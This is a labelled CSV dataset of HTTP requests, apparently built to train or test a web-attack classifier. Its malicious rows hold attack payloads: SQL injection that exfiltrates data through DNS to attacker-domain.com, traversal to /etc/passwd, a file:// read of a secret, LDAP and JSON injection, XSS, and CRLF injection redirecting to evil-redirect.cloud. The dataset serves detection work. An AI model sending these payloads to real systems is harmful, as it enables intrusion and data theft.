label,text
benign,"GET /product/listing?filter%5Bcategory%5D=appliances&filter%5Benergy_rating%5D=a&page=1&sort_by=price_desc HTTP/1.1
Host: smarttech-appliances.info
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Referer: https://smarttech-appliances.info/products
Via: 1.1 smarttech-proxy
Connection: keep-alive"
malicious,"GET /api/data/fetch?record=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%2520version%28%29%29%2C%27.attacker-domain.com%5C%5Cdata%27%29%29%29--%2520 HTTP/1.1
Host: data-analytics-platform.tech
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Accept-Language: en-US
Cache-Control: no-cache
Cookie: analytics_sid=9d8c7b6a5e4f3d2c1b0a9e8f"
benign,"POST /account/reset_password HTTP/1.1
Host: secure-vault-storage.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
User-Agent: Python-urllib/3.11
Accept-Encoding: identity
Connection: close
Referer: https://secure-vault-storage.io/account/reset_password

email=elaine.docherty%40securevault-storage.io"
malicious,"GET /resource/fetch?file=../../../../../../../../etc/passwd HTTP/1.1
Host: fastapi-microservice.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: https://fastapi-microservice.net/dashboard
Connection: keep-alive"
benign,"POST /feedback/submit HTTP/1.1
Host: insights-data-hub.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive

comment=I+need+to+SELECT+the+latest+records+FROM+the+sales+database+to+complete+my+report."
benign,"GET /content/article/read?id=44d5f747-7cd9-4dc1-ab8b-0987e4519d23 HTTP/1.1
Host: newsfeed-lifeinfo.ai
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Connection: close"
benign,"GET /forum/thread/%E4%BC%9A%E8%AD%B0%E8%AB%96%E5%A3%87 HTTP/1.1
Host: community-tech-talk.jp
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: ja-JP,ja;q=0.9,en-US;q=0.7,en;q=0.4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community-tech-talk.jp/forums"
malicious,"GET /dashboard/settings?config=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%2520version%28%29%29%2C%27.attacker-domain.com%5C%5Cdata%27%29%29%29--%2520 HTTP/1.1
Host: user-management-system.io
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: gzip, deflate
Cookie: UMSESSIONID=7e5a3c1d9b8f0246c5d7a1e9
Connection: keep-alive"
benign,"GET /search/api/v1/items?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: analytics-dashboard.cloud-insights.io
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /v2/logs/submit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
Content-Length: 209

{
  ""device"": ""sensor-42"",
  ""event_details"": ""Temperature reading normal\"", \""threshold_exceeded\"": false, \""alert_sent\"": false, \""original_event\"": \"""",
  ""timestamp"": ""2024-06-15T13:45:30Z""
}"
benign,"POST /api/feedback/submit HTTP/1.1
Host: feedback.campus-portal.edu
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Type: application/json
Content-Length: 38
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

{""user_comments"": {""UNION ALL"": ""positive""}}"
benign,"GET /app/user/dashboard?refresh=true HTTP/1.1
Host: user-dashboard-system.coop
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Authorization: Bearer e8fskf8q72jenq12l2v9
Connection: keep-alive"
benign,"GET /sitemap.xml HTTP/1.1
Host: clearwatersparesort.com
User-Agent: curl/7.85.0
Accept: application/xml
Connection: close"
malicious,"POST /user/query/filter HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Length: 94

{""searchFilter"": ""(title=moderator)(objectClass=person))(|(uid=administrator)""}"
benign,"POST /password/reset/request HTTP/1.1
Host: wellness-tracker-app.io
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36
Referer: https://wellness-tracker-app.io/login

email=jason.durand%40healthmail.io"
benign,"GET /gallery/search?style=modern&style=abstract&style=surreal HTTP/1.1
Host: visualinnovations.studio
User-Agent: curl/7.85.0
Accept: */*
Connection: close"
benign,"GET /api/v3/swagger.json HTTP/1.1
Host: digital-health-records.cloud
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
DNT: 1
Connection: keep-alive"
benign,"GET /fonts/noto-sans-regular.woff2 HTTP/1.1
Host: multilingualcontent.info
Connection: keep-alive
Accept: font/woff2,application/font-woff2;q=0.9
Referer: https://multilingualcontent.info/css/noto-sans.css
Origin: https://multilingualcontent.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36"
benign,"GET /forum/posts?tag=javascript&tag=python&tag=webdev&sort=new HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: keep-alive"
benign,"GET /api/v2/gallery/images?token=eyJ2YWx1ZSI6IjEyMzQiLCJmbGFncyI6WyJucyIsIm5ld3MifQ==&extra=eyJlbnYiOiJjdXN0b20ifQ== HTTP/1.1
Host: creative-media-hub.tv
Accept: application/json
User-Agent: python-requests/2.28.1
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"GET /resource/proxy/file%3A%2F%2F%2Fhome%2Fubuntu%2F.secret HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Accept: */*
Referer: https://my-personal-blog-site.info/blog/article/view
Connection: close"
benign,"PUT /profile/settings HTTP/1.1
Host: client-dashboard.app-portal.dev
If-Match: ""3d2e1fb7c8a9b654""
Content-Type: application/x-www-form-urlencoded
Cookie: session_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
Content-Length: 65
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Connection: keep-alive

email_notifications=enabled&theme=dark&language=en&timezone=UTC%2B1"
benign,"DELETE /api/v4/posts/7123 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: ApiKey 8849d33c35b144a083c6a98854b2d2a7
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: application/json
Referer: https://community.game-dev-forum.org/posts/7123
Connection: keep-alive"
benign,"GET /profile-pictures/latest/user12345.webp HTTP/1.1
Host: friendly-social-network.app
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Referer: https://friendly-social-network.app/home
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"GET /blog/article/view HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us
X-User-Input: <iframe src=""data:text/html;base64,PGh0bWw+PHNjcmlwdD5hbGVydChbJ21vYmlsZScsCiAntXNlciddKTwvc2NyaXB0PjwvaHRtbD4=""></iframe>"
benign,"POST /api/v2/goals/update HTTP/1.1
Host: personal-goals-tracker.io
Content-Type: application/json
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 74
Connection: keep-alive

{""daily_goals"": [""Meditate 10 minutes"",""Walk 5000 steps"",""Read 2 chapters of a novel""]}"
benign,"OPTIONS /resources/items/9931-http-delete HTTP/1.1
Host: cloud-sync-services.biz
Origin: https://editor.video-edit-suite.org
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-US,en;q=0.9
Pragma: no-cache"
benign,"GET /news/%E6%97%A5%E6%9C%AC%E6%96%B0%E8%81%9E HTTP/1.1
Host: global-info-journal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Connection: keep-alive"
benign,"POST /polls/vote/300 HTTP/1.1
Host: express-voting-platforms.dev
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Content-Length: 21
Connection: keep-alive
Referer: https://express-voting-platforms.dev/polls/300

poll_id=300&choice_id=1"
malicious,"POST /v1/auth/redirect HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json
Content-Type: application/json
Content-Length: 278
Referer: https://console.cloud-data-services.ai/login
Cookie: auth_token=af2398dc9fdec7123a4b821c275edb1a

{""redirect_url"": ""/dashboard%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://evil-redirect.cloud%0d%0a%0d%0a<html><body>Loading...</body></html>""}"
benign,"GET /browser-extension/update-check.js HTTP/1.1
Host: extension-server.io
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Accept: application/javascript,*/*;q=0.9
Referer: https://extension-server.io/dashboard
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.90 Safari/537.36
Accept-Language: en-US,en;q=0.9"
